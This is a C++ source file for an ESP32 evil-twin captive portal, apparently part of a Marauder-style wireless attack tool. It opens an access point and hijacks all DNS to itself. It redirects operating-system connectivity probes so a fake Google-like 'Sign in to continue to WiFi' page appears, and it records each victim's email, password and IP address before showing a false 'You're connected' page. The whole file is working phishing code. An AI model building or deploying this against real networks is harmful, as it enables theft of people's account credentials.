#include "CaptivePortal.h"
#include "DisplayUI.h"

static const char FALLBACK_PORTAL[] PROGMEM = R"HTML(<!doctype html><html><head>
<meta name=viewport content="width=device-width,initial-scale=1"><title>Sign in</title>
<style>body{font-family:sans-serif;background:#f1f3f4;display:flex;justify-content:center;padding-top:8vh}
.card{background:#fff;padding:32px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.2);width:320px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:4px;font-size:16px}
h2{font-weight:400;margin:0 0 4px}p{color:#5f6368;font-size:14px}</style></head><body>
<div class=card><h2>Sign in</h2><p>to continue to WiFi</p>
<form action="/get" method="GET">
<input name="email" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button>Sign in</button></form></div></body></html>)HTML";

static const char ACK_PAGE[] PROGMEM = R"HTML(<!doctype html><html><head>
<meta name=viewport content="width=device-width,initial-scale=1"><title>Connected</title>
<style>body{font-family:sans-serif;background:#f1f3f4;display:flex;justify-content:center;padding-top:10vh}
.card{background:#fff;padding:32px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.2);width:320px;text-align:center}
h2{font-weight:400;color:#188038}</style></head><body>
<div class=card><h2>You're connected</h2><p>You can close this page.</p></div></body></html>)HTML";

bool CaptivePortal::start(const String& ssid, uint8_t ch) {
    if (g_state.state == RunState::PORTAL_UP) return true;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid.c_str(), nullptr, ch);
    delay(100);
    IPAddress ip = WiFi.softAPIP();

    _dns.start(53, "*", ip);      // wildcard DNS hijack -> everything resolves to us
    _routes();
    _server.begin();
    _registerEvents();

    g_state.state     = RunState::PORTAL_UP;
    g_state.ssid      = ssid;
    g_state.channel   = ch;
    g_state.startedAt = millis();

    DisplayUI::onState(true, ssid, ch, ip.toString());
    CMDSER.printf("EVT state,up,%s,%u,%s\r\n", ssid.c_str(), ch, ip.toString().c_str());
    return true;
}

void CaptivePortal::stop() {
    _server.stop();
    _dns.stop();
    WiFi.softAPdisconnect(true);
    g_state.state = RunState::IDLE;
    DisplayUI::onState(false, "", 0, "");
    CMDSER.println("EVT state,down");
}

void CaptivePortal::handle() {
    if (g_state.state != RunState::PORTAL_UP) return;
    _dns.processNextRequest();
    _server.handleClient();
}

void CaptivePortal::_routes() {
    _server.on("/", HTTP_GET, [this]() { _servePortal(); });
    _server.on("/get", HTTP_GET, [this]() { _handleGet(); });  // Marauder contract
    _server.on("/ack", HTTP_GET, [this]() { _server.send_P(200, "text/html", ACK_PAGE); });

    // OS captive-portal probes -> pop the login page on the client
    const char* probes[] = {"/generate_204", "/gen_204", "/hotspot-detect.html",
        "/library/test/success.html", "/ncsi.txt", "/connecttest.txt",
        "/redirect", "/canonical.html", "/success.txt", "/fwlink"};
    for (auto* p : probes)
        _server.on(p, HTTP_GET, [this]() { _redirectToPortal(); });

    _server.onNotFound([this]() { _redirectToPortal(); });
}

void CaptivePortal::_servePortal() {
    if (g_state.portal.length() && PortalStore::exists(g_state.portal)) {
        File f = PortalStore::store().open(PortalStore::portalPath(g_state.portal), "r");
        _server.streamFile(f, "text/html");   // streamed from disk: no RAM copy, no size cap
        f.close();
    } else {
        _server.send_P(200, "text/html", FALLBACK_PORTAL);
    }
}

void CaptivePortal::_handleGet() {
    String email = _server.arg("email");
    String pass  = _server.arg("password");
    CaptureLog::add(email, pass, _server.client().remoteIP().toString());
    _server.send_P(200, "text/html", ACK_PAGE);
}

void CaptivePortal::_redirectToPortal() {
    _server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
    _server.sendHeader("Cache-Control", "no-cache");
    _server.send(302, "text/plain", "");
}

void CaptivePortal::_registerEvents() {
    if (_eventsRegistered) return;
    _eventsRegistered = true;
    WiFi.onEvent([](WiFiEvent_t, WiFiEventInfo_t info) {
        DisplayUI::setClients(WiFi.softAPgetStationNum());
        CMDSER.printf("EVT client,%02X:%02X:%02X:%02X:%02X:%02X,join\r\n",
            info.wifi_ap_staconnected.mac[0], info.wifi_ap_staconnected.mac[1],
            info.wifi_ap_staconnected.mac[2], info.wifi_ap_staconnected.mac[3],
            info.wifi_ap_staconnected.mac[4], info.wifi_ap_staconnected.mac[5]);
    }, ARDUINO_EVENT_WIFI_AP_STACONNECTED);
    WiFi.onEvent([](WiFiEvent_t, WiFiEventInfo_t info) {
        DisplayUI::setClients(WiFi.softAPgetStationNum());
        CMDSER.printf("EVT client,%02X:%02X:%02X:%02X:%02X:%02X,leave\r\n",
            info.wifi_ap_stadisconnected.mac[0], info.wifi_ap_stadisconnected.mac[1],
            info.wifi_ap_stadisconnected.mac[2], info.wifi_ap_stadisconnected.mac[3],
            info.wifi_ap_stadisconnected.mac[4], info.wifi_ap_stadisconnected.mac[5]);
    }, ARDUINO_EVENT_WIFI_AP_STADISCONNECTED);
}
